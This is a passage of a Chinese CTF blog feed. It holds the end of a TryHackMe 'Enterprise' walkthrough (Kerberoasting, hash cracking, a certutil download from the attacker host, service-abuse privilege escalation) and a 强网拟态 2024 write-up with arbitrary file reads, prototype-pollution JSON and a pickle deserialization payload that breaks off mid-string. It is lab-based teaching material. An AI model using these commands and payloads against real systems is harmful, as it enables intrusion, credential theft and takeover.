class="built_in">users</span> -dc-ip 10.10.184.113</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023194833249-196889267.png" alt="image-20241023194812832"></p><p>接下来查看是否有用户设置了<code>SPN</code>，如果有的话，我们可以请求<code>TGS</code>密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi!</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023185802387-322860292.png" alt="image-20241023185741834"></p><p>发现<code>bitbucket</code>用户设置了<code>SPN</code>，我们请求<code>TGS</code>并尝试破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi! -request</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023185920000-1248219664.png" alt="image-20241023185859159"></p><p>将上述票据保存为<code>hash</code>，使用<code>john</code>爆破<code>hash</code>值</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023195207909-243147148.png" alt="image-20241023195147299"></p><p>爆破出密码<code>littleredbucket</code></p><p>rdp尝试登陆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:bitbucket /p:littleredbucket /v:lab.enterprise.thm</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023203011100-308824680.png" alt="image-20241023202950998"></p><p>在桌面找到<code>user.txt</code></p><h1 id="提权至root"><a href="#提权至root" class="headerlink" title="提权至root"></a>提权至root</h1><p>使用<code>PowerUp.ps1</code>来分析可能提升权限的漏洞，将文件传到靶机上</p><p>攻击机启动python服务</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023210727187-1693192503.png" alt="image-20241023210705120"></p><p>从受害者机器上，我们使用<code>certutil</code>从 <code>Powershell</code> 获取可执行文件：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-f</span> http://<span class="number">10.14</span>.<span class="number">90.122</span>:<span class="number">8000</span>/PowerUp.ps1 PowerUp.ps1</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024160000887-1751636811.png" alt="image-20241024155939035"></p><p>运行<code>PowerUp.ps1</code>后执行<code>Invoke-AllChecks</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. .\PowerUp.ps1</span><br><span class="line"><span class="built_in">Invoke-AllChecks</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024161255216-268400229.png" alt="image-20241024161233438"></p><p>我们发现<code>zerotieroneservice</code>是作为<code>SYSTEM</code>运行的，并且可以重启该服务</p><p>使用下面的命令滥用此功能，将当前用户<code>bitbucket</code>添加到管理员组</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Install-ServiceBinary</span> <span class="literal">-Name</span> <span class="string">&quot;zerotieroneservice&quot;</span> <span class="literal">-Command</span> <span class="string">&quot;net localgroup Administrators lab.enterprise.thm\bitbucket /add&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024162013069-1833540896.png" alt="image-20241024161951199"></p><p>执行后，我们重启<code>zerotieroneservice</code>服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe stop zerotieroneservice</span><br><span class="line">sc.exe <span class="built_in">start</span> zerotieroneservice</span><br></pre></td></tr></table></figure><p>查看一下当前用户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user bitbucket</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024162313666-1753984328.png" alt="image-20241024162251879"></p><p>发现我们当前属于<code>Administrator</code>组</p><p>使用<code>evil-winrm</code>登录（使用evil-winrm的原因纯粹是因为我rdp登录卡的要死）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.76.81 -u bitbucket -p littleredbucket</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024162856683-1105115210.png" alt="image-20241024162834485"></p><p>找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Enterprise</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="Windows" scheme="https://ya1orin.github.io/tags/Windows/"/>
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
    <category term="Active Directory" scheme="https://ya1orin.github.io/tags/Active-Directory/"/>
    
  </entry>
  
  <entry>
    <title>强网拟态 2024</title>
    <link href="https://ya1orin.github.io/posts/c9a637a4.html"/>
    <id>https://ya1orin.github.io/posts/c9a637a4.html</id>
    <published>2024-10-21T01:23:52.000Z</published>
    <updated>2024-10-21T05:11:47.768Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="capoo-一血"><a href="#capoo-一血" class="headerlink" title="capoo (一血)"></a>capoo (一血)</h2><p>爽喽</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093643112-333016867.png" alt="image-20241019162216319"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093709026-2029109064.png" alt="image-20241019151935942"></p><p>f12发<img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093741131-1763474644.png" alt="image-20241019152114885">现读的图片，感觉应该能任意文件读取，读一下<code>/etc/passwd</code></p><p>发现能读，再看一下环境变量<code>/proc/1/environ</code>，没有</p><p>再看一下<code>/proc/1/cmdline</code>，发现存在<code>/bin/sh/docker-entrypoint.sh</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093821659-1694154678.png" alt="image-20241019152243867"></p><p>再尝试一下start.sh</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093836336-503712739.png" alt="image-20241019152349796"></p><p>找到flag名称，直接读就能出flag</p><h2 id="ez-picker"><a href="#ez-picker" class="headerlink" title="ez_picker"></a>ez_picker</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> json, file <span class="keyword">as</span> file_, text, redirect</span><br><span class="line"><span class="keyword">from</span> sanic_cors <span class="keyword">import</span> CORS</span><br><span class="line"><span class="keyword">from</span> key <span class="keyword">import</span> secret_key</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">app = Sanic(<span class="string">&quot;App&quot;</span>)</span><br><span class="line">pickle_file = <span class="string">&quot;data.pkl&quot;</span></span><br><span class="line">my_object = &#123;&#125;</span><br><span class="line">users = []</span><br><span class="line"></span><br><span class="line">safe_modules = &#123;</span><br><span class="line">    <span class="string">&#x27;math&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;datetime&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;collections&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">safe_names = &#123;</span><br><span class="line">    <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;datetime&#x27;</span>, <span class="string">&#x27;timedelta&#x27;</span>, <span class="string">&#x27;timezone&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;loads&#x27;</span>, <span class="string">&#x27;dumps&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;namedtuple&#x27;</span>, <span class="string">&#x27;deque&#x27;</span>, <span class="string">&#x27;Counter&#x27;</span>, <span class="string">&#x27;defaultdict&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> safe_modules <span class="keyword">and</span> name <span class="keyword">in</span> safe_names:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CORS(app, supports_credentials=<span class="literal">True</span>, origins=[<span class="string">&quot;http://localhost:8000&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">token_required</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">request, *args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = jwt.decode(token, <span class="built_in">str</span>(secret_key), algorithms=[<span class="string">&#x27;HS256&#x27;</span>], options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">True</span>&#125;)</span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Token expired&quot;</span>&#125;, status=<span class="number">401</span>)</span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid token&quot;</span>&#125;, status=<span class="number">401</span>)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&quot;role&quot;</span>] != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Permission Denied&quot;</span>&#125;, status=<span class="number">401</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> func(request, *args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_reader</span>(<span class="params">request</span>):</span><br><span class="line">    file = <span class="string">&quot;app.py&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> text(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@token_required</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> file_(<span class="string">&#x27;templates/upload.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;No file provided&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    file = request.files.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    file_object = file[<span class="number">0</span>] <span class="keyword">if</span> <span class="built_in">isinstance</span>(file, <span class="built_in">list</span>) <span class="keyword">else</span> file</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        new_data = restricted_loads(file_object.body)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            my_object.update(new_data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Pickle object loaded but not updated&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(pickle_file, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            pickle.dump(my_object, f)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Pickle object updated&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span> pickle.UnpicklingError:</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;Dangerous pickle file&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> file_(<span class="string">&#x27;templates/register.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.json:</span><br><span class="line">        NewUser = User(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br><span class="line">        merge(request.json, NewUser)</span><br><span class="line">        users.append(NewUser)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">    <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Register Success!&quot;</span>, <span class="string">&quot;redirect&quot;</span>: <span class="string">&quot;/login&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> file_(<span class="string">&#x27;templates/login.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.json:</span><br><span class="line">        username = request.json.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        password = request.json.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Username or password missing&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">        user = <span class="built_in">next</span>((u <span class="keyword">for</span> u <span class="keyword">in</span> users <span class="keyword">if</span> u.username == username), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            <span class="keyword">if</span> user.password == password:</span><br><span class="line">                data = &#123;<span class="string">&quot;user&quot;</span>: username, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">                data[<span class="string">&#x27;exp&#x27;</span>] = <span class="built_in">int</span>(time.time()) + <span class="number">60</span> * <span class="number">5</span></span><br><span class="line">                token = jwt.encode(data, <span class="built_in">str</span>(secret_key), algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">                response = json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;redirect&quot;</span>: <span class="string">&quot;/upload&quot;</span>&#125;)</span><br><span class="line">                response.cookies[<span class="string">&quot;token&quot;</span>] = token</span><br><span class="line">                response.headers[<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>] = request.headers.get(<span class="string">&#x27;origin&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid password&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;User not found&quot;</span>&#125;, status=<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>题目给了源码,</p><ul><li>存在merge,并且User类有<code>__init__</code>,一眼原型链污染,可以污染到<code>global</code>全局变量</li><li>存在<code>RestrictedUnpickler</code>并重写了<code>find_class</code>,可以绕过来<code>pickle</code>反序列化</li></ul><p>​    所以这道题思路就是先利用原型链污染来污染<code>secret_key</code>伪造<code>admin</code>，再污染<code>safe_modules</code>和<code>safe_names</code>来绕过<code>RestrictedUnpickler</code>限制即可.</p><p>源码中<code>/register</code>路由可以进行原型链污染</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093950109-474360410.png" alt="image-20241019162312868"></p><p>在<code>/upload</code>路由可以上传pkl文件来触发pickle反序列化.</p><p>所以直接先传</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;secret_key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123456&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>污染<code>secret_key</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094025395-485307447.png" alt="image-20241019162519604"></p><p>之后jwt伪造</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094030306-835463532.png" alt="image-20241019162618743"></p><p>再污染</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;safe_names&quot;</span> <span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;getattr&quot;</span><span class="punctuation">,</span><span class="string">&quot;system&quot;</span><span class="punctuation">,</span><span class="string">&quot;dict&quot;</span><span class="punctuation">,</span><span class="string">&quot;globals&quot;</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line">和</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;safe_modules&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;builtins&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>之后根据<a href="https://goodapple.top/archives/1069">博客</a>里面绕过<code>builtins</code>的例子写<code>payload</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data=<span class="string">&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;builtins&#x27;</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span 